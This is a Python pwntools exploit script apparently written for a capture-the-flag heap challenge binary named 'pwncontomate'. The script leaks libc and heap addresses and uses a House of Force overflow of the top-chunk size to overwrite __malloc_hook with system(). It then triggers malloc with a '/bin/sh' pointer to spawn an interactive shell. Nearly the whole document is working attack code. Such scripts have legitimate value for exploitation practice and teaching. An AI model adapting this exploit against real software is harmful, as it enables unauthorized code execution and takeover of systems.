#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./pwncontomate')
context.terminal = ['tmux', 'splitw', '-hp', '70']
context.bits = 64
libc = elf.libc
def start():
    if args.GDB:
        return gdb.debug('./pwncontomate', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 9999)
    else:
        return process('./pwncontomate')

def malloc(size, data):
    r.send("1")
    r.sendafter("pwncitos?: ", f"{size}")
    r.sendafter("ngredientes: ", data)
    r.recvuntil("> ")


r = start()
r.timeout = 0.1

#========= exploit here ===================
#leaks
r.recvuntil("atencion ")
libc.address = int(r.recvline(),16) - libc.sym.puts
log.info(f"libc = {hex(libc.address)}")

r.recvuntil(" vuelto ")
heap = int(r.recvline(), 16)
log.info(f"heap = {hex(heap)}")

#overflow the top size chunk to a max number
malloc(24, b"/bin/sh\x00"+b"Y"*16 + pack(0xffffffffffffffff))
#calculating the offste to malloc hook
offset =  (libc.sym.__malloc_hook -0x20) - (heap+0x20)
#requesting a big chunk to wrap around the program
malloc(offset, b"Y")
#requesting a 0x20 chunk to write into the malloc hook
malloc(24, pack(libc.sym.system))
#last malloc to call /bin/sh as first argument of malloc
#it needs to be passed as an integer
malloc(heap + 0x10, b"Y")

#========= interactive ====================
r.interactive()
